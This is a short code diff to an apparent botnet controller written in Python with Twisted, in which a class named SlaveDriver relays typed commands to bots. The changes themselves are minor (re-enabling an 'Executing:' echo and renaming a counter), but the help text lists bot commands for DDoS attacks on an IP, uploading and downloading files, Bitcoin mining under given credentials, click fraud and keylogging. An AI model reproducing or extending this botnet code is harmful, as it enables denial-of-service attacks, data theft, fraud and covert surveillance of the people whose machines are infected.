@@ -95,7 +95,7 @@ class SlaveDriver(basic.LineReceiver):
         self.transport.write('>>> ')
 
     def lineReceived(self, line):
-        #self.sendLine('Executing: ' + line)
+        self.sendLine('Executing: ' + line)
         self.handlecmd(line)
         self.transport.write('>>> ')
 
@@ -109,7 +109,7 @@ class SlaveDriver(basic.LineReceiver):
     	   self.transport.write('Invalid Command\n')
     	   self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], BITCOIN [username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n')
         else:
-            self.commands += 1
+            self.count += 1
             self.parsecommands(line) #pass line for instructions that have more than one argument
 
 if len(sys.argv) != 4:
